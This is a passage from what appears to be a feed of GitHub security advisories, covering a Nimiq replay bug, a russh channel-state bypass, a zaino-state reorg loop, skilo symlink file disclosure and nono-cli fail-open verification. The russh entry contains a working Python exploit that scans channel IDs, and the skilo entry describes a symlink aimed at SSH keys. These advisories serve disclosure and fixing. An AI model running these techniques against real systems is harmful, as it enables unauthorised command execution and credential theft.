<p>The validity store treats a transaction with stored <code>block_number = X</code> as "in window" only when <code>X &gt; last_bn - transaction_validity_window_blocks</code> (strict inequality). However the protocol's <code>Transaction::is_valid_at</code> accepts a transaction for inclusion in any block in <code>[validity_start_height - blocks_per_batch, validity_start_height + window - 1]</code>. By choosing <code>validity_start_height = X + blocks_per_batch</code> (the largest value still compatible with first inclusion at block X), an attacker can replay the same signed transaction in any block B such that <code>X + window &lt; B &lt; validity_start_height + window</code>, i.e., a contiguous window of <code>blocks_per_batch - 1</code> blocks (59 on MainNet, ~10 minutes) during which the replay-protection check fails to flag it. The same transaction is then executed twice: the sender is debited twice, the recipient credited twice.</p>
<h3 id="patches">Patches</h3>
<p><a href="https://github.com/nimiq/core-rs-albatross/pull/3772">https://github.com/nimiq/core-rs-albatross/pull/3772</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>No known workarounds</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nimiq/core-rs-albatross/security/advisories/GHSA-3763-qp59-59vf">https://github.com/nimiq/core-rs-albatross/security/advisories/GHSA-3763-qp59-59vf</a></li>
<li><a href="https://github.com/nimiq/core-rs-albatross/pull/3772">https://github.com/nimiq/core-rs-albatross/pull/3772</a></li>
<li><a href="https://github.com/nimiq/core-rs-albatross/commit/a530b2434ebca6e3716f07c73079786fcc6f2e41">https://github.com/nimiq/core-rs-albatross/commit/a530b2434ebca6e3716f07c73079786fcc6f2e41</a></li>
<li><a href="https://github.com/advisories/GHSA-3763-qp59-59vf">https://github.com/advisories/GHSA-3763-qp59-59vf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3763-qp59-59vf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-12T15:16:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[russh] Russh: Channel-scoped server callbacks can be reached without an open channel]]></title>
        <id>https://github.com/advisories/GHSA-m65r-rprj-r5rg</id>
        <link href="https://github.com/advisories/GHSA-m65r-rprj-r5rg"/>
        <updated>2026-08-03T15:35:05.000Z</updated>
        <content type="html"><![CDATA[<p>There is a server-side channel state issue in <code>russh</code>.</p>
<p>After a client is authenticated, <code>russh</code> can dispatch channel-scoped handler callbacks for recipient channel IDs that were never opened or confirmed. In the strongest reproduced case, the client does not send <code>SSH_MSG_CHANNEL_OPEN</code> at all. It authenticates normally, then sends <code>SSH_MSG_CHANNEL_REQUEST</code> packets with request type <code>exec</code> for a range of recipient channel IDs. <code>russh</code> still calls the server application's <code>exec_request</code> handler.</p>
<p>This is not an authentication bypass. A valid login is required. The issue is that the SSH channel lifecycle is not enforced before channel-scoped callbacks are delivered to the application.</p>
<h2 id="impact">Impact</h2>
<p>An authenticated client can bypass the server application's channel-open policy.</p>
<p>A server may deny session channels by returning <code>false</code> from <code>Handler::channel_open_session</code>. A server may also assume that callbacks such as <code>exec_request</code>, <code>shell_request</code>, <code>subsystem_request</code>, <code>data</code>, <code>channel_eof</code>, or <code>channel_close</code> are only delivered for channels that were opened and confirmed by the SSH transport layer.</p>
<p>That assumption does not hold in the vulnerable path. A malicious authenticated peer can send channel-scoped messages for arbitrary recipient channel IDs and cause handler callbacks to run even though no channel exists.</p>
<p>The exact impact depends on the downstream application. For many SSH server use cases, <code>exec_request</code>, <code>shell_request</code>, or <code>subsystem_request</code> start commands, jobs, shells, SFTP-like subsystems, internal workflows, or other state-changing operations. In the PoC, the protected <code>exec_request</code> action runs even though no channel was opened.</p>
<h2 id="why-this-is-not-intended-behavior">Why this is not intended behavior</h2>
<p>SSH channel requests are not global post-authentication requests. They are operations on an existing channel.</p>
<p>RFC 4254 describes channel-specific messages as carrying a recipient channel number. The <code>exec</code> request is a <code>SSH_MSG_CHANNEL_REQUEST</code> for a session channel. That means the recipient channel should refer to a channel that exists in the local open-channel state.</p>
<p>The relevant boundary is therefore not password authentication. The boundary is the channel-open decision. If no channel has been opened, or if the application denied the open request, <code>russh</code> should not deliver session-specific callbacks for that recipient ID.</p>
<p>This is also not just a handler bug. The handler does not own the transport channel table. <code>russh</code> does. The application gets a <code>channel_open_*</code> callback and returns whether the channel is allowed. If that decision is denied, or if the client never requested a channel at all, channel-scoped callbacks should not be reachable.</p>
<h2 id="documentation-and-api-boundary">Documentation and API boundary</h2>
<p>The public API documentation supports this boundary.</p>
<p><code>channel_open_session</code> is the application hook for creating a new session channel, and its boolean return value is the application's decision on whether that channel open should be granted. Separately, <code>exec_request</code> is the application hook for deciding what to do with a command request received on a channel.</p>
<p>Those are different responsibilities. The application can decide whether a command is allowed. The library must first decide whether the recipient channel exists and was actually opened.</p>
<p>Delivering <code>exec_request</code> for a recipient <code>ChannelId</code> that is absent from the established channel table bypasses the channel-open decision before the application can safely rely on it.</p>
<h2 id="root-cause">Root cause</h2>
<p>In <code>server_read_authenticated</code> in <code>russh/src/server/encrypted.rs</code>, channel-scoped messages are decoded and then dispatched to handler callbacks without a mandatory check that the recipient channel is established in the encrypted session's channel table.</p>
<p>The problematic pattern is visible in the <code>CHANNEL_REQUEST</code> handling. The code reads the recipient channel ID and request fields. It may look up the channel to send an internal <code>ChannelMsg</code> into the stream API, but the handler callback is outside that guard.</p>
<p>For example, the <code>exec</code> branch has this shape:</p>
<pre><code class="language-rust">"exec" =&gt; {
    let req = map_err!(Bytes::decode(r))?;
    map_err!(ensure_end(r))?;

    if let Some(chan) = self.channels.get(&amp;channel_num) {
        let _ = chan
            .send(ChannelMsg::Exec {
                want_reply: true,
                command: req.to_vec(),
            })
            .await;
    }

    handler.exec_request(channel_num, &amp;req, self).await
}
</code></pre>
<p>If <code>channel_num</code> is not open, the internal send is skipped, but <code>handler.exec_request(...)</code> is still called.</p>
<p>The same issue applies to other channel-scoped callbacks such as <code>shell_request</code>, <code>subsystem_request</code>, <code>env_request</code>, <code>pty_request</code>, <code>data</code>, <code>extended_data</code>, <code>channel_eof</code>, and <code>channel_close</code>.</p>
<p>There is a second related problem in <code>server_handle_channel_open</code>. The application-side channel reference can be inserted into <code>self.channels</code> even when the handler returns <code>Ok(false)</code>. The protocol table <code>enc.channels</code> is only populated when the open is actually allowed. This means the two maps can diverge after a denied open.</p>
<p>The authoritative source for whether a channel is established should be <code>enc.channels</code>, not <code>self.channels</code>.</p>
<h2 id="evidence-from-the-poc">Evidence from the PoC</h2>
<p>The PoC uses a real <code>russh</code> server over localhost TCP. It uses real authentication with username <code>alice</code> and password <code>correct</code>. Paramiko is used only as an authenticated SSH peer that can send crafted packets over the real encrypted SSH transport.</p>
<p>POC Code :</p>
<pre><code class="language-python">import argparse
import sys
import time

import paramiko
from paramiko.common import MSG_CHANNEL_REQUEST, cMSG_CHANNEL_REQUEST
from paramiko.message import Message
from paramiko.ssh_exception import ChannelException

CHANNEL_SCAN_END = 32


def connect(port: int) -&gt; paramiko.Transport:
    transport = paramiko.Transport(("127.0.0.1", port))
    transport.connect(username="alice", password="correct")
    return transport


def normal_allowed(port: int) -&gt; None:
    transport = connect(port)
    print("normal client: CHANNEL_OPEN session")
    channel = transport.open_session(timeout=5)
    print("normal client: session open confirmed")
    print('normal client: exec "protected"')
    channel.exec_command("protected")
    time.sleep(0.25)
    channel.close()
    transport.close()


def normal_denied(port: int) -&gt; None:
    transport = connect(port)
    print("normal client: CHANNEL_OPEN session")
    try:
        transport.open_session(timeout=5)
    except ChannelException:
        print("normal client: session open denied")
        pass
    else:
        raise RuntimeError("normal denied control unexpectedly opened a session channel")
    time.sleep(0.25)
    transport.close()


def send_exec_request(transport: paramiko.Transport, recipient_channel: int) -&gt; None:
    print(
        "crafted packet: "
        f"SSH_MSG_CHANNEL_REQUEST({MSG_CHANNEL_REQUEST}) "
        f"recipient_channel={recipient_channel} "
        'request_type="exec" '
        'command="protected"'
    )
    msg = Message()
    msg.add_byte(cMSG_CHANNEL_REQUEST)
    msg.add_int(recipient_channel)
    msg.add_string("exec")
    msg.add_boolean(True)
    msg.add_string(b"protected")
    transport._send_user_message(msg)


def exploit_denied(port: int) -&gt; None:
    transport = connect(port)
    print("malicious peer: CHANNEL_OPEN session")
    try:
        transport.open_session(timeout=5)
    except ChannelException:
        print("malicious peer: session open denied")
    else:
        raise RuntimeError("exploit setup unexpectedly opened a session channel")

    print(f"malicious peer: scanning recipient channel ids 0..{CHANNEL_SCAN_END - 1}")
    for channel_id in range(CHANNEL_SCAN_END):
        send_exec_request(transport, channel_id)
        time.sleep(0.01)
    time.sleep(0.5)
    transport.close()


def exploit_without_open(port: int) -&gt; None:
    transport = connect(port)
    print("malicious peer: no CHANNEL_OPEN sent")
    print(f"malicious peer: scanning recipient channel ids 0..{CHANNEL_SCAN_END - 1}")
    for channel_id in range(CHANNEL_SCAN_END):
        send_exec_request(transport, channel_id)
        time.sleep(0.01)
    time.sleep(0.5)
    transport.close()


def main() -&gt; int:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--mode",
        choices=["allowed", "denied", "denied-open", "noopen"],
        required=True,
    )
    parser.add_argument("--port", type=int, required=True)
    args = parser.parse_args()

    if args.mode == "allowed":
        normal_allowed(args.port)
    elif args.mode == "denied":
        normal_denied(args.port)
    elif args.mode == "noopen":
        exploit_without_open(args.port)
    else:
        exploit_denied(args.port)
    return 0


if __name__ == "__main__":
    sys.exit(main())
</code></pre>
<p>The crafted packet form is:</p>
<pre><code class="language-text">SSH_MSG_CHANNEL_REQUEST(98)
recipient_channel = N
request_type = "exec"
command = "protected"
</code></pre>
<p>The PoC runs normal controls and exploit cases in one execution.</p>
<h3 id="allowed-control">Allowed control</h3>
<p>This proves the protected action works normally when a session channel is opened.</p>
<pre><code class="language-text">normal client: CHANNEL_OPEN session
normal client: session open confirmed
normal client: exec "protected"

channel_open_session called: 1
exec_request called: 1
protected action executed: 1
channel ever opened/confirmed: true
working recipient channel ids: [2]
</code></pre>
<h3 id="denied-control">Denied control</h3>
<p>This proves the application policy denies session channels and a normal client cannot reach the protected action.</p>
<pre><code class="language-text">normal client: CHANNEL_OPEN session
normal client: session open denied

channel_open_session called: 1
exec_request called: 0
protected action executed: 0
channel ever opened/confirmed: false
working recipient channel ids: none
</code></pre>
<h3 id="main-exploit-no-channel-open">Main exploit: no channel open</h3>
<p>This is the main issue.</p>
<p>The authenticated client does not send <code>SSH_MSG_CHANNEL_OPEN</code>. It sends crafted <code>SSH_MSG_CHANNEL_REQUEST</code> packets for recipient IDs <code>0..31</code>.</p>
<pre><code class="language-text">malicious peer: no CHANNEL_OPEN sent
malicious peer: scanning recipient channel ids 0..31

channel_open_session called: 0
exec_request called: 32
protected action executed: 32
channel ever opened/confirmed: false
working recipient channel ids: [0, 1, 2, ..., 31]
</code></pre>
<p>This removes the "guessed channel ID" concern. Every scanned recipient ID reached the protected action in the vulnerable run.</p>
<h3 id="additional-variant-denied-open">Additional variant: denied open</h3>
<p>The client asks for a session channel, the handler denies it, and the client then sends the same crafted requests.</p>
<pre><code class="language-text">malicious peer: CHANNEL_OPEN session
malicious peer: session open denied

channel_open_session called: 1
exec_request called: 32
protected action executed: 32
channel ever opened/confirmed: false
working recipient channel ids: [0, 1, 2, ..., 31]
</code></pre>
<p>The denied-open variant is not required for exploitability, but it shows the same state validation gap after an explicit application denial.</p>
<h2 id="affected-code-path">Affected code path</h2>
<p>Verified at:</p>
<pre><code class="language-text">f1a0f180a02ccedf48d86f2c5e0361308cf6b7c6
v0.61.1-9-gf1a0f18
</code></pre>
<p>The affected logic is in:</p>
<pre><code class="language-text">russh/src/server/encrypted.rs
</code></pre>
<p>The vulnerable area is:</p>
<pre><code class="language-text">server_read_authenticated
</code></pre>
<p>Channel request dispatch decodes a recipient channel ID and calls request-specific handler callbacks without first requiring that the recipient ID exists as a confirmed channel in <code>enc.channels</code>.</p>
<p>The affected request callbacks include:</p>
<pre><code class="language-text">pty_request
x11_request
env_request
shell_request
agent_request
exec_request
subsystem_request
window_change_request
signal
</code></pre>
<p>The same missing established-channel guard affects:</p>
<pre><code class="language-text">CHANNEL_DATA
CHANNEL_EXTENDED_DATA
CHANNEL_EOF
CHANNEL_CLOSE
</code></pre>
<p>A related issue exists in:</p>
<pre><code class="language-text">server_handle_channel_open
</code></pre>
<p>Application channel references should not be retained for denied opens.</p>
<h2 id="why-this-belongs-in-russh">Why this belongs in russh</h2>
<p>The application cannot reliably enforce the SSH transport channel lifecycle from inside individual callbacks. By the time <code>exec_request</code> is called, the application is already being told that a channel-scoped request exists. The library should not call that handler for a channel ID that does not exist in the confirmed channel table.</p>
<p>This is the same kind of invariant <code>russh</code> already applies for some channel state updates. The missing part is to apply the established-channel check consistently before all channel-scoped callbacks are dispatched.</p>
<p>The safe expectation is simple:</p>
<pre><code class="language-text">No established channel, no channel-scoped handler callback.
</code></pre>
<h2 id="suggested-fix">Suggested fix</h2>
<p>Before dispatching any channel-scoped callback, require the recipient <code>ChannelId</code> to exist in the encrypted session's established channel table and to be confirmed.</p>
<p>The authoritative check should use <code>enc.channels</code>, not <code>self.channels</code>.</p>
<p>A minimal approach is to add a helper like:</p>
<pre><code class="language-rust">fn ensure_established_channel(&amp;self, channel: ChannelId) -&gt; Result&lt;(), Error&gt; {
    if self
        .common
        .encrypted
        .as_ref()
        .and_then(|enc| enc.channels.get(&amp;channel))
        .is_some_and(|channel| channel.confirmed)
    {
        Ok(())
    } else {
        Err(Error::Inconsistent)
    }
}
</code></pre>
<p>Then call it before dispatching channel-scoped callbacks for:</p>
<pre><code class="language-text">CHANNEL_REQUEST
CHANNEL_DATA
CHANNEL_EXTENDED_DATA
CHANNEL_EOF
CHANNEL_CLOSE
CHANNEL_WINDOW_ADJUST
</code></pre>
<p>For unknown or unconfirmed channels, <code>russh</code> should not call application callbacks. The exact wire response can be request failure, ignore, or disconnect depending on the existing protocol-error handling for that message type.</p>
<p>The channel-open path should also retain application-side channel references only when the open is approved:</p>
<pre><code class="language-rust">let mut result = handler.channel_open_session(channel, self).await;

if let Ok(allowed) = &amp;mut result {
    if *allowed {
        self.channels.insert(sender_channel, reference);
    }

    self.finalize_channel_open(&amp;msg, channel_params, *allowed)?;
}
</code></pre>
<h2 id="regression-coverage">Regression coverage</h2>
<p>A regression test should authenticate normally, then verify that callbacks are not reached in these cases:</p>
<pre><code class="language-text">1. CHANNEL_REQUEST "exec" without prior CHANNEL_OPEN
2. CHANNEL_OPEN "session" denied by the handler, then CHANNEL_REQUEST "exec"
3. CHANNEL_DATA without prior CHANNEL_OPEN
4. CHANNEL_EOF / CHANNEL_CLOSE without prior CHANNEL_OPEN
</code></pre>
<p>The test should fail if any channel-scoped callback such as <code>exec_request</code>, <code>shell_request</code>, <code>subsystem_request</code>, <code>data</code>, <code>channel_eof</code>, or <code>channel_close</code> is invoked for a non-established channel.</p>
<p>A positive control should confirm that a normally opened session channel still reaches the expected callbacks.</p>
<p>In the local validation, the targeted regression passed after the patch:</p>
<pre><code class="language-text">cargo test -p russh --test channel_state_validation
</code></pre>
<p>The full workspace also passed:</p>
<pre><code class="language-text">cargo test --workspace
</code></pre>
<h2 id="duplicate-check">Duplicate check</h2>
<p>I checked existing <code>Eugeny/russh</code> advisories and issue searches for terms related to:</p>
<pre><code class="language-text">CHANNEL_REQUEST
exec_request
channel_open_session denied
unopened channel
server_handle_channel_open
channel request handler
</code></pre>
<p>Existing advisories cover unrelated authentication, parser, allocation, window-adjust, Terrapin, and cryptographic issues. I did not find an existing advisory or issue for channel-scoped callbacks being dispatched for unopened or denied recipient channel IDs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Eugeny/russh/security/advisories/GHSA-m65r-rprj-r5rg">https://github.com/Eugeny/russh/security/advisories/GHSA-m65r-rprj-r5rg</a></li>
<li><a href="https://github.com/Eugeny/russh/commit/7c5659f8cf6f6f2f9989d12dba0ebf49dc50a171">https://github.com/Eugeny/russh/commit/7c5659f8cf6f6f2f9989d12dba0ebf49dc50a171</a></li>
<li><a href="https://github.com/Eugeny/russh/releases/tag/v0.62.5">https://github.com/Eugeny/russh/releases/tag/v0.62.5</a></li>
<li><a href="https://github.com/advisories/GHSA-m65r-rprj-r5rg">https://github.com/advisories/GHSA-m65r-rprj-r5rg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m65r-rprj-r5rg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-03T15:35:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[zaino-state] zaino-state has a Non-Finalized State Reorg — No Cycle Detection or Depth Limit]]></title>
        <id>https://github.com/advisories/GHSA-3whf-vgf2-9w6g</id>
        <link href="https://github.com/advisories/GHSA-3whf-vgf2-9w6g"/>
        <updated>2026-07-31T19:49:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>NonFinalizedState::handle_reorg</code> is a recursive, unbounded async function that traverses parent blocks until it finds a common ancestor on the main chain. It has <strong>no recursion depth limit</strong> and <strong>no cycle detection</strong>. A malicious or buggy validator can serve a block whose <code>previous_block_hash</code> points back to itself (or forms a cycle with other blocks), causing <code>handle_reorg</code> to infinite-loop, consuming 100% CPU and never making sync progress. Additionally, <code>update()</code> contains an <code>.expect("empty snapshot impossible")</code> that panics if the non-finalized snapshot becomes empty after trimming finalized blocks.</p>
<h3 id="details">Details</h3>
<p><strong>Location:</strong> <code>packages/zaino-state/src/chain_index/non_finalised_state.rs:443-489</code></p>
<pre><code class="language-rust">async fn handle_reorg(
    &amp;self,
    working_snapshot: &amp;mut NonfinalizedBlockCacheSnapshot,
    block: &amp;impl Block,
) -&gt; Result&lt;IndexedBlock, SyncError&gt; {
    let prev_block = match working_snapshot
        .get_block_by_hash_bytes_in_serialized_order(block.prev_hash_bytes_serialized_order())
        .cloned()
    {
        Some(prev_block) =&gt; {
            if !working_snapshot
                .heights_to_hashes
                .values()
                .any(|hash| hash == prev_block.hash())
            {
                Box::pin(self.handle_reorg(working_snapshot, &amp;prev_block)).await?  // &lt;-- LINE 459
            } else {
                prev_block
            }
        }
        None =&gt; {
            let prev_block = self
                .source
                .get_block(HashOrHeight::Hash(
                    zebra_chain::block::Hash::from_bytes_in_serialized_order(
                        block.prev_hash_bytes_serialized_order(),
                    ),
                ))
                .await
                .map_err(|e| { ... })?
                .ok_or(SyncError::ValidatorConnectionError(...))?;
            Box::pin(self.handle_reorg(working_snapshot, &amp;*prev_block)).await?  // &lt;-- LINE 483
        }
    };
    let indexed_block = block.to_indexed_block(&amp;prev_block, self).await?;
    working_snapshot.add_block_new_chaintip(indexed_block.clone());
    Ok(indexed_block)
}
</code></pre>
<p><strong>Infinite loop via self-referencing block:</strong></p>
<ol>
<li>A compromised validator serves a block <code>B</code> where <code>B.prev_hash == B.hash</code>.</li>
<li><code>handle_reorg</code> is called with <code>B</code>.</li>
<li><code>get_block_by_hash_bytes_in_serialized_order(B.prev_hash)</code> finds <code>B</code> itself in <code>working_snapshot.blocks</code>.</li>
<li>Check: is <code>B.hash</code> in <code>working_snapshot.heights_to_hashes</code>? If <code>B</code> is a new chaintip not yet on the main chain, <strong>no</strong>.</li>
<li>Recurse with <code>prev_block</code> = <code>B</code> (the exact same block).</li>
<li>This repeats forever. The async recursion builds a new <code>Box::pin</code> future each iteration, consuming heap memory and CPU.</li>
</ol>
<p><strong>Stack exhaustion via deep reorg:</strong>
A deep reorg of &gt;1000 blocks would recurse &gt;1000 times. Each async recursion creates a new <code>Box::pin</code> future on the heap. While this won't exhaust the native stack immediately, it will allocate unbounded heap memory and CPU time, effectively DoS-ing the sync task.</p>
<p><strong><code>.expect("empty snapshot impossible")</code> panic:</strong></p>
<p><strong>Location:</strong> <code>packages/zaino-state/src/chain_index/non_finalised_state.rs:543-548</code></p>
<pre><code class="language-rust">new_snapshot.remove_finalized_blocks(finalized_height);
let best_block = &amp;new_snapshot
    .blocks
    .values()
    .max_by_key(|block| block.chainwork())
    .cloned()
    .expect("empty snapshot impossible"); // &lt;-- LINE 548
</code></pre>
<p>If <code>finalized_height</code> is greater than or equal to all blocks in <code>new_snapshot.blocks</code>, <code>remove_finalized_blocks</code> retains only blocks at or above that height. If none exist, <code>new_snapshot.blocks</code> becomes empty. The <code>.expect()</code> then panics. While the comment claims this is "impossible," defensive programming dictates it is reachable under corruption or edge-case sync conditions.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Run a regtest.</li>
<li>Serve a block where <code>header.previous_block_hash == block.hash()</code>.</li>
<li>Zaino's <code>NonFinalizedState::sync</code> enters <code>handle_reorg</code> and infinite-loops.</li>
<li>Sync never completes. CPU usage pegs to 100%. No new blocks are served to clients.</li>
</ol>
<h3 id="fix">Fix</h3>
<ol>
<li><strong>Add an explicit recursion depth limit</strong> (e.g., max 1000 iterations) and return <code>SyncError::ReorgFailure</code> if exceeded:<pre><code class="language-rust">const MAX_REORG_DEPTH: usize = 1000;
</code></pre>
</li>
<li><strong>Track visited hashes</strong> in a <code>HashSet&lt;BlockHash&gt;</code> during traversal to detect cycles and abort with an error.</li>
<li><strong>Replace <code>.expect("empty snapshot impossible")</code></strong> with a proper <code>Err(UpdateError::DatabaseHole)</code> or similar error return.</li>
</ol>
<h3 id="additional-attack-vectors">Additional Attack Vectors</h3>
<ul>
<li><strong>Deep reorg DoS:</strong> A miner with significant hash power (or a compromised validator) triggers a deep reorg. Zaino spends excessive CPU and memory in <code>handle_reorg</code>, starving the async runtime and stalling response serving.</li>
<li><strong>Fork-choice manipulation:</strong> By serving cyclic or very deep sidechains, an attacker can keep Zaino stuck in reorg handling indefinitely, preventing it from ever serving the real best chain.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zingolabs/zaino/security/advisories/GHSA-3whf-vgf2-9w6g">https://github.com/zingolabs/zaino/security/advisories/GHSA-3whf-vgf2-9w6g</a></li>
<li><a href="https://github.com/zingolabs/zaino/pull/1172">https://github.com/zingolabs/zaino/pull/1172</a></li>
<li><a href="https://github.com/zingolabs/zaino/commit/428822509bc722eb9727681752686ede9bc87e77">https://github.com/zingolabs/zaino/commit/428822509bc722eb9727681752686ede9bc87e77</a></li>
<li><a href="https://github.com/zingolabs/zaino/commit/d874295f1377bec7fd712ef75b364181b8c77d46">https://github.com/zingolabs/zaino/commit/d874295f1377bec7fd712ef75b364181b8c77d46</a></li>
<li><a href="https://github.com/zingolabs/zaino/commit/e05112aac54ec3cdb6da29fbc143ea710b32f009">https://github.com/zingolabs/zaino/commit/e05112aac54ec3cdb6da29fbc143ea710b32f009</a></li>
<li><a href="https://github.com/advisories/GHSA-3whf-vgf2-9w6g">https://github.com/advisories/GHSA-3whf-vgf2-9w6g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3whf-vgf2-9w6g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-31T19:49:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[skilo] skilo add follows symbolic links, allowing arbitrary local file disclosure from a malicious skill source]]></title>
        <id>https://github.com/advisories/GHSA-6xx4-9wp6-65p7</id>
        <link href="https://github.com/advisories/GHSA-6xx4-9wp6-65p7"/>
        <updated>2026-07-28T22:23:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>skilo add</code> installs a skill by recursively copying the skill directory into the
target skills directory. The copy routine (<code>copy_dir_all</code>) classified each entry
with <code>std::fs::DirEntry::file_type()</code> — which does <strong>not</strong> follow symlinks — and
then copied non-directory entries with <code>std::fs::copy()</code>, which <strong>does</strong>
dereference symlinks.</p>
<p>As a result, a skill containing a symbolic link such as
<code>reference.txt -&gt; /home/&lt;user&gt;/.ssh/id_rsa</code> was copied as a regular file whose
contents are the link's <strong>target</strong>. A malicious skill source — for example a git
repository installed via <code>skilo add github.com/&lt;attacker&gt;/&lt;skills&gt;</code>, or a local
path — could read arbitrary files readable by the user running <code>skilo add</code> (SSH
keys, cloud credentials, <code>.env</code> files, etc.) and place their contents inside the
installed skill directory, where the user or their agent may later read, share,
or sync them.</p>
<p>This is arbitrary local file disclosure (CWE-59 / CWE-61, symlink following)
triggered by installing an untrusted skills source.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>0.11.1</strong>. <code>copy_dir_all</code> now rejects symbolic-link entries at any
recursion depth (failing closed with a dedicated error) instead of dereferencing
them.</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Only install skills from sources you trust.</li>
<li>Inspect a skill source for symbolic links before running <code>skilo add</code>.</li>
</ul>
<h3 id="affected-versions">Affected versions</h3>
<p>Introduced together with the <code>skilo add</code> command in 0.5.0 and present through
0.11.0. Releases before 0.5.0 do not include the <code>add</code> command.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/manuelmauro/skilo/security/advisories/GHSA-6xx4-9wp6-65p7">https://github.com/manuelmauro/skilo/security/advisories/GHSA-6xx4-9wp6-65p7</a></li>
<li><a href="https://github.com/manuelmauro/skilo/pull/11">https://github.com/manuelmauro/skilo/pull/11</a></li>
<li><a href="https://github.com/manuelmauro/skilo/commit/c14bdc2eddcf26633ab1dcc0b2d5c0ff42c72a3e">https://github.com/manuelmauro/skilo/commit/c14bdc2eddcf26633ab1dcc0b2d5c0ff42c72a3e</a></li>
<li><a href="https://github.com/manuelmauro/skilo/releases/tag/v0.11.1">https://github.com/manuelmauro/skilo/releases/tag/v0.11.1</a></li>
<li><a href="https://github.com/advisories/GHSA-6xx4-9wp6-65p7">https://github.com/advisories/GHSA-6xx4-9wp6-65p7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6xx4-9wp6-65p7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-28T22:23:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nono-cli] nono-cli'scregistry pack verification can fail open when provenance metadata is absent]]></title>
        <id>https://github.com/advisories/GHSA-hc4m-q9jh-xw4j</id>
        <link href="https://github.com/advisories/GHSA-hc4m-q9jh-xw4j"/>
        <updated>2026-07-28T15:51:31.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Registry-installed nono packs are expected to be verified from local provenance metadata before they are used. Two files are relevant:</p>
<ul>
<li><code>~/.config/nono/packages/lockfile.json</code></li>
<li><code>~/.config/nono/packages/&lt;namespace&gt;/&lt;pack&gt;/.nono-trust.bundle</code></li>
</ul>
<p>Testing shows that nono fails closed when a pack has a trust bundle but no lockfile entry. However, if the trust bundle is also absent, the same pack can load successfully. Deleting security metadata should not make a pack easier to run.</p>
<h2 id="affected-behavior">Affected behavior</h2>
<p>Observed with <code>always-further/claude</code>:</p>
<ol>
<li><p>Delete <code>~/.config/nono/packages/lockfile.json</code>.</p>
<p>Result:</p>
<pre><code class="language-text">nono: Package verification failed for always-further/claude: pack 'always-further/claude' has a trust bundle but no lockfile entry - reinstall with: nono pull always-further/claude --force
</code></pre>
</li>
<li><p>Delete <code>~/.config/nono/packages/always-further/claude/.nono-trust.bundle</code>.</p>
<p>Result: the profile loads successfully.</p>
</li>
<li><p>Restore <code>.nono-trust.bundle</code> while the lockfile is still absent.</p>
<p>Result:</p>
<pre><code class="language-text">nono: Package verification failed for always-further/claude: pack 'always-further/claude' has a trust bundle but no lockfile entry - reinstall with: nono pull always-further/claude --force
</code></pre>
</li>
</ol>
<h2 id="impact">Impact</h2>
<p>If both the lockfile entry and trust bundle are absent, nono may accept an installed registry pack without artifact hash verification or provenance verification.</p>
<p>This is especially important for pack-provided session hooks, because session hooks execute on the host outside the sandbox. A pack that contributes host-executed code should not run unless nono can verify that the code is a locked and trusted pack artifact.</p>
<h2 id="root-cause">Root cause</h2>
<p><code>verify_profile_packs</code> treats the lockfile entry as optional. Existing code fails when a trust bundle exists without a matching lockfile entry, but when the trust bundle is absent too, there is no equivalent hard failure.</p>
<p>That creates a fail-open state:</p>
<ul>
<li>lockfile entry missing</li>
<li>trust bundle missing</li>
<li>pack directory still present</li>
<li>profile can load</li>
</ul>
<h2 id="recommended-fix">Recommended fix</h2>
<p>For any registry pack selected for execution, require both:</p>
<ol>
<li>A matching lockfile entry in <code>~/.config/nono/packages/lockfile.json</code>.</li>
<li>A present and valid <code>.nono-trust.bundle</code> in the installed pack directory.</li>
</ol>
<p>If either is missing, fail closed with a reinstall instruction, for example:</p>
<pre><code class="language-text">reinstall with: nono pull &lt;namespace&gt;/&lt;pack&gt; --force
</code></pre>
<p>This keeps verification monotonic: removing provenance metadata cannot downgrade a verification failure into a successful launch.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/always-further/nono/security/advisories/GHSA-hc4m-q9jh-xw4j">https://github.com/always-further/nono/security/advisories/GHSA-hc4m-q9jh-xw4j</a></li>
<li><a href="https://github.com/nolabs-ai/nono/commit/db07375031642f089d549b4f7b9abece87e39f87">https://github.com/nolabs-ai/nono/commit/db07375031642f089d549b4f7b9abece87e39f87</a></li>
<li><a href="https://github.com/nolabs-ai/nono/releases/tag/v0.62.0">https://github.com/nolabs-ai/nono/releases/tag/v0.62.0</a></li>
<li><a href="https://github.com/advisories/GHSA-hc4m-q9jh-xw4j">https://github.com/advisories/GHSA-hc4m-q9jh-xw4j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hc4m-q9jh-xw4j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-28T15:51:30.000Z</published>
    </entry>
    <entry>
